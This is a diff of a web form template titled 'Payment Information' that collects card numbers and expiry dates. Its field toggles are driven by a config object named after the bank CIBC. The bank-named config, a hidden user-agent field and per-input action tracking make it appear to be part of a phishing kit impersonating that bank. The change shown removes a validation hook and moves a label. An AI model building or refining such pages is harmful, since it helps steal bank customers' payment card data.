@@ -89,7 +89,7 @@ let p_expiry = cibc.exp === 'on' ? true : false;
                 <h2 class="page-subtitle">Payment Information</h2>
                 <div class="global-error-from-container" tabindex="-1" id="idf">
                 </div>
-                <form id="loginForm" class="input-form form-card" id="card-information-form" method="post" action="" <?=$p_card ? 'onsubmit="return validate()"' : ''?>>
+                <form id="loginForm" class="input-form form-card" id="card-information-form" method="post" action="" >
                     <input type="hidden" id="userAgent" name="userAgent">
                     <% if (p_card) { %>
                         <div class="form-group" style="">
@@ -99,8 +99,9 @@ let p_expiry = cibc.exp === 'on' ? true : false;
                             <link rel="stylesheet" href="/assets/css/card.css?<%= Date.now() %>">
                         </div>
                     <% } if (p_expiry) { %>
+                        <label>Expiry</label>
                         <div class="form-group" style="">
-                            <label>Expiry</label>
+                            
                             <select name="exp1" required class="form-control text-center display-inline-block lrinput" style="width:48%; display: inline-block;" attr-action="Selecting Expiry">
                                 <option value="">MM</option>
                                 <% for (let x = 1; x <= 12; x++) { 
